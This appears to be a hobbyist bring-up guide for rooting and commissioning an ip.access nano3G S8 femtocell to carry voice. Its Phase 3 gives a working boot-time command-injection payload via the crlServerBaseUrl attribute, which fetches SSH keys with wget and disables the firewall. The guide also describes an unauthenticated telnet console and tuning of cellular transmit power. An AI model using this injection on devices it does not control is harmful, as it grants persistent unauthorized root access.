# Bring-up: ip.access nano3G S8 — from a sealed box to a call

> ### 📋 EVIDENCE CLASS — read this before the steps
> **Every phase below was executed end to end on a stock, un-commissioned nano3G S8 (part
> `QGGIPA237B`, ip.access train `563.16.0`) and produced a cell carrying voice.** It is written from
> that run, not from a vendor document.
> ⚠️ **Where a step is inferred rather than measured, the step says so.** Where a value is
> unit-specific — an address, a serial, a scrambling code — it is marked **`<yours>`** rather than
> printed as though it were a constant.
> ⛔ **This is the S8. It is not the S4, the E8, the E16 or the S16**, and the vendor's own manuals
> disagree with each other across those models — see
> [trap 59](TRAPS.md#59-the-manual-for-your-device-family-may-not-cover-your-model-and-the-one-that-does-has-a-different-version-number).

**Read [`TRAPS.md`](TRAPS.md) first.** On this device almost all of the elapsed time is spent on
traps, not on steps. Several phases below are one command wrapped in three paragraphs of warning,
and the warnings are the part that took the days.

---

## How this device differs from a MicroCell, in one table

| | **DPH-151/153/154** | **nano3G S8** |
|---|---|---|
| Badging | Cisco, for AT&T | ip.access's own product |
| SoCs | **two** on the 151/153 — radio plus a gateway in front of it | **one address**, no gateway SoC |
| Root filesystem | — | **cramfs, read-only**; a separate **jffs2** partition is the only writable storage |
| Antennas | — | ⭐ **internal, and the manual forbids fitting external ones** — [`HARDWARE.md`](HARDWARE.md) |
| Price | ~$10 | $180–200 |
| Documented by | this repo, fail0verflow | ⭐ Osmocom's own wiki, independently maintained |

⇒ **Findings about *addressing and reachability* do not transfer between them** — the MicroCell's
second SoC NATs the radio half and the nano3G has nothing equivalent. **Findings about the ip.access
software stack — attributes, config banks, boot order, the management model — transfer well.**

---

## ⛔ Phase 0 — Before power, and this one is not optional

**Commission on a bench, not on your LAN.** A stock unit's first act on a network is to look for its
operator: DHCP, DNS for management hostnames, then outbound HTTP. ⚠️ **Measured: a stock unit
completed two HTTP connections to an S3 endpoint within minutes of its first LAN boot**, with
replies, before anyone had firewalled it. **It cannot be undone, and it announces the unit exists.**

✅ **The bench is safer than a firewall rule:** a terminal NIC at `192.168.0.2/24`, **no default
gateway**, a direct cable to the AP. The unit has no route anywhere. ⇒ **Do the whole of Phase 1
there.**

⭐ **Read the sticker while it is in your hands.** The model must end **`B`/`BA`** — `QGGIPA237B` is
UMTS Bands 2 & 5. **`QGGIPA237C` is the Band 4 variant**, it commissions perfectly normally, and it
is then silently useless to anyone whose handsets are Band 2/5. ⚠️ **Trust the sticker over any
paperwork that came with it** — we hold a unit whose vendor note records the wrong FCC ID.

---

## Phase 1 — Factory reset, and the 60-second window

> ### 🔴 A stock nano3G has **no configuration channel open at all.** That is the shipped state.
> **Measured on an un-commissioned unit: 28 TCP ports probed, all closed**, against a passing
> control on a converted one. ⇒ **Nothing is wrong with it. It has not been commissioned.**
> ⚠️ **A guide written by reading a converted device cannot see the step that converted it** — this
> phase was missing from our own runbook for exactly that reason.

```
reset      hold the recessed button       ⛔ SEE THE THRESHOLD WARNING BELOW
LED        fast blink (50/50 ms) -> slow blink (200/200 ms) -> extinguishes -> reboots
address    192.168.0.1     web UI: http://192.168.0.1:8089
window     60 SECONDS from boot
```

> ### ⛔ THE HOLD TIME: **3 seconds, not 5.** Every document says 5. The binary says 3.
> `ipa-switchmon`'s own help text: **`< 3 s` = reboot (104)**, **`> 3 s` = restore factory defaults
> (103)**. ⇒ **`> 5 s` as an instruction to OBTAIN a restore is correct and has margin. `< 5 s` as
> an assurance AGAINST one is FALSE across a two-second band** in which the device destroys
> `nv_env.sh`, root's home directory, `pki.cfg` and both config banks.
> **Hold 6–8 s when you want a restore. Never assume a 4-second press was a reboot.**
> 📌 Full entry: [trap 49](TRAPS.md#49-the-reset-button-reaches-factory-restore-sooner-than-the-manual-says).

> ### 🔴 THE 60-SECOND WINDOW IS A ONE-SHOT LATCH. MISS IT AND THE WEB UI IS GONE.
> A boot-time script arms a timer and tests **`[ "$ENV_COMMISSIONING_INTERFACE_ENABLED" = "" ]`** —
> note **`= ""`**, not `!= FALSE`. On expiry it **writes `FALSE` to NV and reboots.** The variable is
> then non-empty forever, the timer never re-arms, and **only a factory restore clears it.**
> ```
> unset / empty   web UI ENABLED   + timer ARMED -> reboot at +60 s   🔴 usable once
> "FALSE"         web UI DISABLED  + not armed                        ⚠️ safe, and dead
> "TRUE"          web UI ENABLED   + not armed                        ✅ the only good state
> ```
> ⭐ **Authenticating creates `/tmp/webif_user_logged_in`, which disarms the timer** — so log in
> immediately, before doing anything else. ✅ **And the moment you have a root shell, run
> `setnv_env.sh ENV_COMMISSIONING_INTERFACE_ENABLED TRUE`.** One command, no downside, and it is
> the step whose absence costs the next person a factory reset.

**Commission the unit** through the web UI, then let it move to your LAN. ⚠️ **Applying config in
the UI regenerates `init.dmi` — which matters in Phase 3.**

---

## Phase 2 — A management channel

After a successful commission, **TCP 8090** answers on the LAN address: a plain telnet DMI console
with **no authentication of any kind**, exposing ~700 MIB attributes and 31 actions.

⚠️ **It is open only because two conditions hold** — `ENV_START_DMI_TELNET="TRUE"` **and** no
`init.dmi` file present. **Uploading an `init.dmi` closes it.** See Phase 3; this is a genuine
either/or, not a preference.

> ### ⛔ `ipa-dmi -c` COLLIDES WITH A CONSOLE SESSION, AND THE WEDGE DOES NOT SELF-CLEAR
> Two concurrent invocations leave `:8090` in a state where the banner still prints instantly with a
> prompt, **and every `get` returns empty.** ⇒ **One DMI command at a time**, and check for orphaned
> `-c` processes afterwards — one outlived its SSH session and needed `kill -9`.
> ⛔ **Never repair it with `/etc/init.d/dmistart start`.** Measured: **it does not bind 8090 even
> with the manager alive**, and its sibling `stop` takes the manager down, which the process
> watchdog turns into **a reboot of the board.**
> ✅ The safe repair is `kill -9` the wedged `ipa-dmi -u 8090` and restart **only that listener**.

---

## Phase 3 — Root

**`/var/ipaccess/nv_env.sh` is sourced as root early in boot**, and several MIB string attributes
are written into it verbatim as `export VAR="<value>"`. **There is no input validation on that write
path** — `;`, backticks, `$()` and `|` all round-trip unmodified. The DMI parser owns the double
quotes, so the string cannot be closed that way; **it does not need to be, because `$(...)` executes
inside double quotes.**

```
set crlServerBaseUrl="x$(COMMAND)"        ->  COMMAND runs as root at every boot
```

> ### ⭐ TWO ROUTES IN, AND THEY ARE MUTUALLY EXCLUSIVE BY DESIGN
> The vendor's own `dmistart()` is an **`if`/`else`**:
> ```sh
> if [ -f /var/ipaccess/init.dmi ]; then ipa-dmi -c "call init.dmi" &   # the RUNNER
> else if [ "$ENV_START_DMI_TELNET" == TRUE ]; then ipa-dmi -u 8090 &   # the LISTENER
> ```
> ⇒ ⭐⭐ **The `init.dmi` runner XOR the `:8090` listener. Never both.** This single line explains
> every *"the listener will not start"* result, including `dmistart start` failing to bind.
> **Route A — DMI console (Phase 2 open):** write the payload to `crlServerBaseUrl` directly.
> **Route B — upload an `init.dmi`** through the commissioning UI's file field, containing the same
> `set` lines. **Use this when `:8090` is closed.** ⚠️ **It suppresses the listener while it exists.**
> ✅ **Once root persists, DELETE `init.dmi`** — `:8090` then listens natively and the unit becomes
> structurally identical to one converted by Route A.

**The payload — staged, never truncating:**
```
set crlServerBaseUrl="x$(mkdir -p /var/ipaccess;wget -O /var/ipaccess/.authkeys.new http://<yours>:9998/k && mv /var/ipaccess/.authkeys.new /var/ipaccess/.authkeys.bak;mkdir -p /root/.ssh;cp /var/ipaccess/.authkeys.bak /root/.ssh/authorized_keys;chmod 600 /root/.ssh/authorized_keys;/opt/ipaccess/bin/setnv_env.sh ENV_VERBOSE_CONSOLE_ENABLED TRUE;/opt/ipaccess/bin/setnv_env.sh ENV_FIREWALL_DISABLED TRUE)"
```
⛔ **Do not use a bare `wget -O` onto `authorized_keys`.** `wget -O` **truncates the target before it
knows the fetch worked** — a dead key server destroys your only way in. **Stage to a temporary name,
`&&`-gate the move, install from the local copy.**

**Two reboots, and this is not optional.** `$( )` runs in a **subshell**, so `export` inside it
cannot reach the parent. `setnv_env.sh` edits the *file*; `sshd` has already started with the old
value.
```
reboot 1   payload runs as root: key installed, flags written.  sshd still on loopback.
reboot 2   sshd reads TRUE, binds 0.0.0.0:22.  SSH works.
```
⭐ **Why port 22 scanned as *refused* rather than filtered all along:** `dropbear` was always
running — bound to `127.0.0.1:22`, because `ENV_VERBOSE_CONSOLE_ENABLED` was not `TRUE`.

Legacy client flags are required:
```sh
ssh -i <yourkey> -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa \
    -o Ciphers=+aes128-cbc -o MACs=+hmac-sha1 root@<ap>
```

> ### ⭐ ROOT PERSISTS VIA THE **ATTRIBUTE**, NOT VIA A FILE
> Measured with `init.dmi` deleted and the key restored across **27 boots**: persistence is carried
> by the `crlServerBaseUrl` **MIB attribute**, which is re-sourced every boot. ⇒ **Several sources
> imply the `init.dmi` file is load-bearing for root. It is not.** ⛔ **Do not scrub that attribute
> in a tidy-up** — on a unit converted this way it is 100 % of your access.

---

## Phase 4 — Make Iuh possible

The stock unit ships **without the `iapc` package** — the process that carries the Iuh stack — and
`opnormal` falls back to `soiprouter` silently. **But the Iuh protocol libraries are already present
and licensed** (`libranap`, `librua`, `libhnbap`); on our unit only `libsctp.so.1` was missing.

⚠️ **`/` is read-only cramfs**, so `/opt/ipaccess/Iapc/` cannot be created. Install to the writable
jffs2 partition and **bind-mount patched copies over the stock files** from a boot script hooked
into `nv_env.sh`. Two stock files gate Iuh on `[ -x /opt/ipaccess/Iapc/iapc.sh ]`, a path that
cannot exist on cramfs.

> ### ⛔ `IUH_ENABLE` — ONE KEY, TWO FILES, **TWO DIFFERENT PARSERS**
> ```
> uplayerapp.cfg :  IUH_ENABLE 1     <- ONE line   (sscanf "%s%d")
> 3gcntrl.cfg    :  IUH_ENABLE       <- TWO lines: strcmp of the WHOLE line
> ```
> ⇒ **Appending `IUH_ENABLE 1` to `3gcntrl.cfg` silently fails.** ⭐ **Check the RUNTIME proof, not
> the file** — `grep -c IUH_ENABLE` on a config is not evidence the flag took.
> ⚠️ **These live in a config bank the AP regenerates.** Read which bank is live — `ls -l
> /var/ipaccess/config` — **never assume it.** It differs per device.

---

## Phase 5 — Bring-up, and the gate that confuses everyone

> ### ⭐ THE READINESS GATE IS A **PRODUCT** OF BRING-UP, NOT A PRECONDITION FOR IT
> A firmware status word reads `0` on a unit nobody has brought up, and **waiting will never change
> it** — the normal boot path never programs the radio array. **Bring-up's own first step programs
> it**, and the poll ~50 lines later *verifies that step worked*. ⇒ **Zero before bring-up is the
> correct reading.** 📌 [trap 57](TRAPS.md#57-the-readiness-gate-reads-zero-on-a-healthy-unit-because-bring-up-is-what-opens-it).
> ⛔ **Order is load-bearing: array first, applications after.** Programming the array against a live
> application set is a RUNNING→STOPPED transition under a process whose job is to notice it —
> **it reboots the board.**

**Bring-up is one-shot per boot.** Reboot first; re-running it without a reboot re-fires the connect
and unlock actions and **takes the cell down — true even if the first run succeeded.**

⛔ **If you run it from a deployed copy, verify that copy by `md5`, not by mtime.** Ours diverged
from the repo four times in one day, and a stale copy sent its DMI actions **to the other AP** — a
live, serving cell.

---

## Phase 6 — Radio parameters: `CONFIGURED`, and the order that cannot be undone

**Do not run a Network Listen scan.** It is not needed in `CONFIGURED` mode, and *"do not scan"*
removes the question of whether it transmits — which nobody has settled.

```
cellParameterSelectionMethod (2870) = CONFIGURED
rfParamsCandidateList (1891)        = ({<uarfcn>, <psc>, 1})     applied AT BOOT
```
⚠️ **`uarfcnDownlink`/`uarfcnUplink` are read-only reports.** Writing one **succeeds and does
nothing** — the device recomputes it. That looks exactly like a band change that did not take.
🔴 **A staged `rfParamsCandidateList` is a LOADED CHANGE: ANY reboot applies it** — not only the one
you intended. **Compare staged against live before any reboot, on any unit.**

> ### 🔴 NARROW THE POWER WINDOW **BEFORE** ENTERING `CONFIGURED`. THIS ORDER IS IRREVERSIBLE.
> **In `AUTO` the CPICH limits are BOUNDS. In `CONFIGURED` they are SETTINGS.** A factory
> `cpichTxPowerUpperLimit` of `500` is the 3GPP SIB5 ceiling — an unset field at its maximum — and
> becomes the requested power the moment the mode changes.
> ⇒ **Set the window first, verify by readback, then change the mode.**
> ⚠️ **Two separate cautions on the numbers:** `2595` is what you **request**; a different attribute
> reports what is **radiated** — do not assert a power change from the knob. And **read the
> hardware maximum live from `maximumPowerCapability (1863)` on the unit in front of you.** A literal
> copied from another unit's write-up is how a stale docstring became a "hardware ceiling" in ours.

---

## Phase 7 — Unlock, and why a refusal is good news

```
action unlock            then      action selectCellParams
```
⛔ **`selectCellParams` is a no-op while the radio resource manager is locked.** It acks and does
nothing. **Order matters: unlock, then select.**

> ### ⭐ A DECLINED UNLOCK IS INFORMATIVE. DO NOT FORCE THE ATTRIBUTE PAST IT.
> On this device the numeric unlock **does** dispatch — measured in a working unit's own bring-up
> log across two runs, declined on attempt 1 and confirmed on attempt 2. ⇒ **A decline means the
> device is not ready yet**, and it is the most honest signal available.
> 🔴 **Writing the state attribute by hand to "fix" it turns an informative decline into a silent
> one and leaves the real stall in place.** ⚠️ **A direct set changes a VALUE; an action runs a
> HANDLER** — and on readback the two are indistinguishable.
> ⛔ **Never fire `rrmUnlock`.** Measured by paired isolation: it commands the radio-resource process
> to **exit**.

**The transmission gate is `uarfcnDownlink` (1684).** `rrmAdminState` and `rrmOperationalState` are
**not** — if `1684` reads `-1` there is no carrier, however healthy everything else looks.

⭐ **And the one witness that is not the device describing itself is the Service LED.** *Off with a
short green blink every 3 seconds* = **administratively locked**, whatever any attribute says. The
full table is in [`HARDWARE.md`](HARDWARE.md).

---

## Phase 8 — Why handsets still will not camp

Two independent faults here, and each alone is enough. **They stack**, which is why fixing one
changes nothing.

> ### ⛔ (a) THE CSG INDICATOR — a cell that is invisible rather than rejected
> A CSG-enforcing handset checks (PLMN, CSG-ID) against its allowed list, finds no entry, judges the
> cell **not suitable — and never transmits.** ⇒ **It does not appear as a rejection anywhere**, on
> the AP or in the core. Every instrument says the cell is healthy.
> ```
> accessDecisionMode = LEGACY        AND    csgAccessMode = OPEN_ACCESS
> ```
> ⛔ **Neither half works alone, and `LEGACY` without `OPEN_ACCESS` is a SILENT DENY-ALL** — worse
> than the broken baseline, because the vendor's "legacy" mode means *stop advertising the gate,
> keep enforcing it.*
> 🔴 **AND ON OUR UNIT THE PAIR WAS NECESSARY BUT NOT SUFFICIENT.** With both set and verified,
> `csgIndicator (3212)` still read **TRUE** and needed a **direct write to FALSE.**
> ⇒ ⭐ **Read `3212` directly. Do not infer it from the pair.**

> ### ⛔ (b) THE AP MAY HAVE NO CELL IDENTITY OF ITS OWN
> If you use an Iuh shim, it hardcodes the identity and writes it into the config object on every
> start — **so the core's view is correct and comes from the shim, not from the AP.** Meanwhile the
> **air path still reads the MIB**, where an un-provisioned unit has:
> ```
> mcc (1398) ""   ·  mnc (1399) ""   ·  sac (1583) -1
> lacRacCandidateList (2048) ({1,(0)})  ·  saiLac (2098) -1  ·  hnbCId -1
> ```
> ⇒ **A cell with no PLMN, LAC or SAC transmits, and a UE reads it and declines it** — while
> `show hnb` prints a perfect identity. **The loud consumer masks the silent one's absence.**
> ⛔ **Setting one of these is not enough. Set all six.**
> 📌 [trap 61](TRAPS.md#61-the-cell-registers-on-the-core-with-a-perfect-identity-while-its-own-mib-has-none--because-a-shim-supplies-it).

⚠️ **And once it is on air, "no handset camps" may not be a fault at all.** If another cell is
already serving them, an idle handset has no reason to reselect, and **nothing in this project has
ever configured a neighbour relation** — so handsets on the other cell are not told this one exists.
**Power is a blunt lever for that; a neighbour list is the real one, and it is untested here.**

---

## Phase 9 — Confirm, without lying to yourself

```
uarfcnDownlink (1684)        a real UARFCN, never -1        <- THE transmission gate
Service LED                  solid green                     <- hardware-side, independent
core: registration state     SCTP_ESTABLISHED                <- not a connection COUNT
```
⛔ **On the core, do not grep for a connected-count string.** The obvious pattern **matches the
negative sentence too** — `"No HNB connected"` contains `"HNB connected"`. **Digit-anchor it, or
test the negative first.** And a count is not liveness: **a stale association prints a healthy count
through a dead peer for minutes.** `SCTP_ESTABLISHED` is the positive test.

---

## What is still open on this device

- **Neighbour relations and handover.** Never configured here. **Assume a call does not survive
  moving between cells until you have proven otherwise.**
- **Whether the access-control list survives a reboot.** Measured **not** to on our unit, while
  nothing consulted it. **Measure it before relying on closed access.**
- **One unexplained ~90-minute outage** after an edit to the boot payload, from which the unit
  recovered unaided. **Neither our stall hypothesis nor a bank-failover hypothesis fits the timing.**
  **Recorded as unexplained rather than closed.**
